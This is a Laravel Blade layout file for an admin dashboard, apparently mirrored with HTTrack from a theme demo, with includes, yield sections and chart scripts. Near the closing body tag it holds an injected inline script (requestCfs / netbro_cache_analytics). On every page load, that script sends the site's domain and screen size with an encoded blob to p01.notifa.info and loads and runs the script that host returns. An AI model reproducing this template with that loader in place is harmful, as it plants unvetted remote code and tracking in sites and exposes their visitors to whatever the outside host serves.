<!DOCTYPE html>
<html>


<!-- Mirrored from demo.lorvent.com/clean/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 08:27:10 GMT -->
<head>
    <meta charset="UTF-8">
    <title>Admin 21</title>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <link rel="shortcut icon" href="{{ asset ('clean/img/favicon.ico')}}"/>
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
    <!-- global css -->
    <link type="text/css" href="{{ asset ('clean/css/app.css')}}" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="{{ asset ('clean/css/custom.css')}}">
    <!-- end of global css -->
    <!--pagelevel css-->
<link rel="stylesheet" href="{{ asset ('clean/vendors/morrisjs/morris.css')}}">
    <link rel="stylesheet" href="{{ asset ('clean/css/pages/dashboard1.css')}}">
    @yield('css')

    <!--end of pagelevel css-->
</head>

<body>
<script src="{{ asset ('js/sweet.min.js')}}" type="text/javascript"></script>
@include('sweet::alert')
<!-- header logo: style can be found in header-->
@include('partials.headerdesktop')
<div class="wrapper">
    <!-- Left side column. contains the logo and sidebar -->
    @include('partials.sidebar')
    <aside class="right-aside">
        <!-- Content Header (Page header) -->
        <section class="content-header">
            <h1>Dashboard</h1>
        </section>
        <!-- Main content -->
        @yield('content')
        <!-- /.content -->
    </aside>
    <!-- /.right-side -->
</div>
<!-- ./wrapper -->
<!-- global js -->
<script src="{{ asset ('js/app.js')}}" type="text/javascript"></script>
<!--morris chart-->
<script src="{{ asset ('clean/vendors/raphael/raphael.min.js')}}" type="text/javascript"></script>
<script src="{{ asset ('clean/vendors/morrisjs/morris.min.js')}}" type="text/javascript"></script>
<script src="{{ asset ('js/plugins/jquery.flot.spline.js')}}" type="text/javascript"></script>

<script src="{{ asset ('js/pages/dashboard1.js')}}" type="text/javascript"></script>
<!-- end of page level js -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdYlWI2d16ypuekK2SwJHFDaC8AvTuSonEqPnLpZmbiM9LrOEwLoUiFHtmQ0%2fRBQdOOLxPTCAVNNlXwZzTDbOP8XPOslExkuDMPzZwjd8rYcs67w4TJ4IrOjUin02pAYuJqFdGecjb0TF4fGkIxZUjc5wOi1zF452EHDEH%2fnNxnsm2WfHGv1Td9zbv4GF8X32793tzIQuZuxUq2sXgQqjXjO9hCQQ%2bd0MOFTTbXkruMs0x%2b3OMbVezyvxCL75oBU2raHItNWNMGQBhQR4HItduCtuKkCabAXXtr4YU0l5syyUxounKahB4PHCok6dAXBrNB4D9%2bmr2%2f6OdXxYLTc4v5BSWtOkhp4xKgtX0NKEZRXn7YwjL22J8YEyfAjZLSWmJmvDTGgvAgnl%2bFy68BrGiEyenVJvOMY%2f387wcwHX3BpnRsI8Vs86Tqwo2ZN7Kqn7%2bfIXvw81HxM%2b8u3Bs7aP5%2bBM3xQ9mO8%2bN" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demo.lorvent.com/clean/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 08:27:44 GMT -->
@yield('js')

</html>
